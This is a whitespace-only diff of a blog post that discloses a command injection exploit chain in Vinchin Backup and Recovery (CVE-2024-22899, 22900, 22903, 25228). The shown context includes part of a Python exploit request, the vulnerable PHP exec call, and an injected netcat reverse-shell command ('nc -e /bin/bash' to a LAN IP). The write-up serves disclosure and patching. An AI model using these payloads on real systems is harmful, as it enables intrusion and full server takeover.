@@ -25,11 +25,11 @@ image = "cover.png"
 - [Exploitation Methods](#exploitation-methods)
     - [A. Webdriver Chrome Simulation:](#a-webdriver-chrome-simulation)
     - [B. `curl` Method (using setNetworkCardInfo as example):](#b-curl-method-using-setnetworkcardinfo-as-example)
-- [Deep Dive into the `setNetworkCardInfo` Function Vulnerability (CVE-2024-22900)](#deep-dive-into-the-setnetworkcardinfo-function-vulnerability-cve-2024-22900)    
-- [Deep Dive into the `syncNtpTime` Function Vulnerability (CVE-2024-22899)](#deep-dive-into-the-syncntptime-function-vulnerability-cve-2024-22899)  
-- [Deep Dive into the `deleteUpdateAPK` Function Vulnerability (CVE-2024-22903)](#deep-dive-into-the-deleteupdateapk-function-vulnerability-cve-2024-22903)  
-- [Deep Dive into the `getVerifydiyResult` Function Vulnerability (CVE-2024-25228)](#deep-dive-into-the-getverifydiyresult-function-vulnerability-cve-2024-25228)  
-- [Full Exploit Chain](#full-exploit-chain)  
+- [Deep Dive into the `setNetworkCardInfo` Function Vulnerability (CVE-2024-22900)](#deep-dive-into-the-setnetworkcardinfo-function-vulnerability-cve-2024-22900)
+- [Deep Dive into the `syncNtpTime` Function Vulnerability (CVE-2024-22899)](#deep-dive-into-the-syncntptime-function-vulnerability-cve-2024-22899)
+- [Deep Dive into the `deleteUpdateAPK` Function Vulnerability (CVE-2024-22903)](#deep-dive-into-the-deleteupdateapk-function-vulnerability-cve-2024-22903)
+- [Deep Dive into the `getVerifydiyResult` Function Vulnerability (CVE-2024-25228)](#deep-dive-into-the-getverifydiyresult-function-vulnerability-cve-2024-25228)
+- [Full Exploit Chain](#full-exploit-chain)
 
 
 ![](/vinchin-backup-rce-chain-2024/vinchin_stable.png)
@@ -155,7 +155,7 @@ response = requests.post(
     headers=headers,
     data=data,
     verify=False,
-)                     
+)
 print(response.text)
 ```
 
@@ -225,7 +225,7 @@ In this request, the attacker has appended a command (`nc -e /bin/bash 192.168.1
 
 #### Conclusion:
 
-The `setNetworkCardInfo` function's vulnerability highlights the dangers of using user-supplied input in system commands without proper validation and sanitization. This vulnerability poses a severe risk and can lead to total system compromise. 
+The `setNetworkCardInfo` function's vulnerability highlights the dangers of using user-supplied input in system commands without proper validation and sanitization. This vulnerability poses a severe risk and can lead to total system compromise.
 
 Vinchin should prioritize fixing this vulnerability by implementing robust input validation mechanisms. Users of Vinchin Backup and Recovery should be vigilant and apply any provided patches or updates to mitigate this security risk.
 
@@ -368,7 +368,7 @@ In this request, the attacker appends a reverse shell command (`nc -e /bin/bash 
 
 #### Conclusion:
 
-The `deleteUpdateAPK` function's vulnerability is another instance of command injection due to insufficient input validation. It allows an attacker to execute arbitrary commands on the server, potentially leading to full system compromise. 
+The `deleteUpdateAPK` function's vulnerability is another instance of command injection due to insufficient input validation. It allows an attacker to execute arbitrary commands on the server, potentially leading to full system compromise.
 
 Vinchin should urgently address this vulnerability by implementing strict input validation and command execution controls. Users of Vinchin Backup and Recovery should apply any available security updates to mitigate this risk.
 
@@ -408,7 +408,7 @@ public function getVerifydiyResult($params)
            break;
    }
    ```
-   
+
    When `type` equals 1 (`$verifyType['IP']`), the `verifyPing` method is invoked.
 
 3. **Command Injection in `verifyPing`**:
@@ -416,7 +416,7 @@ public function getVerifydiyResult($params)
    ```php
    exec("ping -c 1" . $value, $outcome, $status);
    ```
-   
+
    Due to the lack of sanitization or validation of `$value`, a command injection vulnerability is introduced.
 
 #### Exploitation:
